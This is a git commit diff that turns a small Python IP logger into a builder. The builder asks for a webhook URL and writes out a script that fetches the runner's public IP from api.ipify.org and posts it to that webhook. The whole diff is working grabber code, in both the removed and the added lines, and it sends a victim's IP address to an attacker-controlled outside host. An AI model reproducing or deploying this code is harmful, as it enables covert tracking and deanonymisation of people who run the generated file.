4d06df82f99ec381706c9957b5ffe942657f3e8d
blob#0005 <88004068+blob76363@users.noreply.github.com>
2022-03-22 18:37:04 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,13 +1,22 @@
 import requests
 
 
-#Webhook Here
-webhook = ""
-
-#Ip Logger
-url = "https://api.ipify.org"
-r = requests.get(url).text
-r = str(r)
-
-#Send Ip To Webhook
-requests.post(webhook, json={"content": f"@everyone Ip: {r}"})
+name = input("Enter File Name: ")
+while True:
+	try:
+		webhook = input("Enter Webhook: ")
+		r = requests.get(webhook)
+		if "200" in str(r):
+			break
+		if "200" not in str(r):
+			print("Webhook Invalid")
+	except Exception:
+		print("Webhook Invalid")
+file = open(f"{name}.py", "a")
+file.write("import requests\n")
+file.write(f'webhook = "{webhook}"\n')
+file.write('url = "https://api.ipify.org"\n')
+file.write("r = requests.get(url).text\n")
+file.write("r = str(r)\n")
+file.write('requests.post(webhook, json={"content": f"@everyone Ip: {r}"})')
+file.close()
